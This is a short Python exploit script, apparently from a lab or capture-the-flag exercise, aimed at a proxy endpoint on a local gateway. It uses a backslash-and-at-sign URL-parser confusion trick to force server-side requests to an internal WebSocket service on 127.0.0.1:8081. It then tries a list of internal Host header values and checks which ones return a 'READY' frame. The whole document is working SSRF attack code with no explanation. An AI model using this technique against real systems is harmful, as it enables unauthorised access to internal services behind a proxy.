import time, select, base64, os, socket
from ws import recv_frame
GW=("127.0.0.1",24606)
INNER="http://rates.partner-forex.example.com\\@127.0.0.1:8081/ws"
def trial(hosthdr):
    s=socket.create_connection(GW,timeout=10)
    req=(f"GET /api/proxy?url={INNER} HTTP/1.1\r\nHost: {hosthdr}\r\n"
         "Upgrade: websocket\r\nConnection: Upgrade\r\n"
         f"Sec-WebSocket-Key: {base64.b64encode(os.urandom(16)).decode()}\r\n"
         "Sec-WebSocket-Version: 13\r\n\r\n")
    s.sendall(req.encode())
    buf=b""
    while b"\r\n\r\n" not in buf:
        c=s.recv(1)
        if not c: break
        buf+=c
    s.setblocking(False); out=[]; end=time.time()+0.9
    while time.time()<end:
        r,_,_=select.select([s],[],[],0.1)
        if r:
            try: out.append(recv_frame(s)[1])
            except Exception: out.append(b"EOF"); break
    s.close()
    return buf.split(b"\r\n")[0].decode(errors="replace"), out
for h in ["rates.partner-forex.example.com","rates.partner-forex.example.com:443","relay.internal",
          "ops.internal","admin","127.0.0.1:8081","localhost","vaultlink.internal","console",
          "operations.vaultlink.internal","ops.vaultlink.internal"]:
    st,out=trial(h)
    rdy=[x for x in out if isinstance(x,bytes) and x.startswith(b"READY")]
    print(f"{h:38s} {st} {rdy}",flush=True)
